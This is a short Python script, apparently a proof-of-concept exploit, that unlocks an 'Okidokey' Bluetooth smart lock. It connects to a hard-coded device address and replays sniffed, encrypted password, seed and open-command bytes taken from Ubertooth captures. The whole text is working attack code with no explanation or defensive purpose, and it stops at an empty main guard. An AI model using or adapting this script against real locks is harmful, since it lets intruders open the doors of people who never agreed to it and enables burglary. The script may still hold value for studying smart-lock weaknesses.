#!/bin/python

# Unlock Okidokey lock

import time
from scapy.all import *
from BTLE import *

def main():
	s = bindsock()
	rand = "00"
	Connect(s, "CC9E4704A578",rand)

	# encypted bytes from ubertooth need encrypted open command and seed from 0x0025
	# encrytped password (change 3rd byte to 00)
	writereq(s, "2500","934800e67578e39966a28c43cdfa9d72ffd9641e")		# password
	writereq(s, "2500","42398f")										# seed
	writereq(s, "2500","e101")

	time.sleep(5)
	disconnect(s)
	
if __name__ == "__main__":
